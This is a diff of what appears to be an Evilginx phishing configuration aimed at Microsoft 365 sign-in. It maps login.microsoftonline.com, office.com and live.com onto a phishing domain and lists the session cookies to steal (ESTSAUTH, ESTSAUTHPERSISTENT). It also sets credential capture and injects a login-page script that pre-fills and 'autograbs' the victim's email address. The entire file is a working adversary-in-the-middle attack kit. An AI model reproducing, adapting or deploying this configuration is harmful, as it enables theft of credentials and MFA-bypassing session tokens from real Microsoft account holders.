@@ -1,67 +1,19 @@
+name: 'Microsoft 365 - Enterprise - V1'
+author: '@waelmas'
 min_ver: '3.2.0'
 redirect_url: 'https://www.office.com'
 
 proxy_hosts:
-  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
-  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoftonline.com', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'portal', orig_sub: 'portal', domain: 'microsoftonline.com', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false, auto_filter: true}
-  - {phish_sub: 'sso', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
-  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msauth.net', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true}
-
-sub_filters:
-  - triggers_on: 'login.microsoftonline.com'
-    orig_sub: 'login'
-    domain: 'microsoftonline.com'
-    search: 'login.microsoftonline.com'
-    replace: 'login.{PHISH_DOMAIN}'
-    mimes: ['text/html', 'application/javascript', 'application/json', 'application/xml', 'text/css']
-  - triggers_on: 'login.microsoftonline.com'
-    orig_sub: 'login'
-    domain: 'microsoftonline.com'
-    search: 'microsoftonline.com'
-    replace: '{PHISH_DOMAIN}'
-    mimes: ['application/javascript', 'application/json']
-  - triggers_on: 'aadcdn.msauth.net'
-    orig_sub: 'aadcdn'
-    domain: 'msauth.net'
-    search: 'aadcdn.msauth.net'
-    replace: 'aadcdn.{PHISH_DOMAIN}'
-    mimes: ['application/javascript', 'text/html', 'application/json']
-  - triggers_on: 'aadcdn.msftauth.net'
-    orig_sub: 'aadcdn'
-    domain: 'msftauth.net'
-    search: 'aadcdn.msftauth.net'
-    replace: 'aadcdn.{PHISH_DOMAIN}'
-    mimes: ['application/javascript', 'text/html']
-  - triggers_on: 'login.live.com'
-    orig_sub: 'sso'
-    domain: 'live.com'
-    search: 'login.live.com'
-    replace: 'sso.{PHISH_DOMAIN}'
-    mimes: ['text/html', 'application/javascript', 'application/json']
-  - triggers_on: 'www.office.com'
-    orig_sub: 'www'
-    domain: 'office.com'
-    search: 'www.office.com'
-    replace: 'www.{PHISH_DOMAIN}'
-    mimes: ['text/html', 'application/javascript']
-  - triggers_on: 'login.microsoftonline.com'
-    orig_sub: 'login'
-    domain: 'microsoftonline.com'
-    search: 'https://login.microsoftonline.com'
-    replace: 'https://login.{PHISH_DOMAIN}'
-    mimes: ['text/html', 'application/javascript', 'application/json']
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoftonline.com', session: false, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false}
+  - {phish_sub: 'sso', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
+  - {phish_sub: 'portal', orig_sub: 'portal', domain: 'microsoftonline.com', session: false, is_landing: false}
 
 auth_tokens:
   - domain: '.login.microsoftonline.com'
     keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
-  - domain: '.office.com'
-    keys: ['RPSAuth', 'WLSSC']
-  - domain: '.live.com'
-    keys: ['WLSSC']
+    type: 'cookie'
 
 credentials:
   username:
@@ -75,18 +27,21 @@ credentials:
 
 login:
   domain: 'login.microsoftonline.com'
-  path: '/'
+  path: '/?auth=2'
 
 js_inject:
   - trigger_domains: ['login.microsoftonline.com']
-    trigger_paths: ['/']
+    trigger_paths: ['/', '/common', '/organizations', '/consumers']
     script: |
       (function() {
+        console.log("[*] O365 Phishlet: email autograb active (console-only mode).");
+
         function findEmailField() {
           return document.querySelector(
-            'input[type="email"], input[name="loginfmt"], input[name="login"], input#i0116'
+            'input[type="email"], input[name="loginfmt"], input[name="login"], input#i0116, input#email'
           );
         }
+
         function getQueryParam(name) {
           name = name.replace(/[\[\]]/g, "\\$&");
           var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
@@ -95,6 +50,8 @@ js_inject:
           if (!results[2]) return '';
           return decodeURIComponent(results[2].replace(/\+/g, " "));
         }
+
+        // ===== 1. PREFILL from ?email= parameter =====
         var prefillEmail = getQueryParam('email');
         if (prefillEmail && prefillEmail.includes('@')) {
           var emailField = findEmailField();
@@ -102,6 +59,33 @@ js_inject:
             emailField.value = prefillEmail;
             emailField.dispatchEvent(new Event('input', { bubbles: true }));
             emailField.dispatchEvent(new Event('change', { bubbles: true }));
+            console.log("[*] PREFILL: " + prefillEmail);
           }
         }
+
+        // ===== 2. AUTOGRAB – log to console only =====
+        var emailGrabbed = false;
+
+        function grabEmail() {
+          if (emailGrabbed) return;
+          var field = findEmailField();
+          if (field && field.value && field.value.includes('@')) {
+            console.log("[*] AUTOGRAB: " + field.value);
+            console.log("[*] TIMESTAMP: " + new Date().toISOString());
+            console.log("[*] SOURCE: browser autofill");
+            emailGrabbed = true;
+            clearInterval(grabInterval);
+          }
+        }
+
+        grabEmail();
+        var grabInterval = setInterval(grabEmail, 500);
+
+        setTimeout(function() {
+          clearInterval(grabInterval);
+          if (!emailGrabbed) {
+            console.log("[*] AUTOGRAB: No email detected within timeout.");
+          }
+        }, 15000);
+
       })();
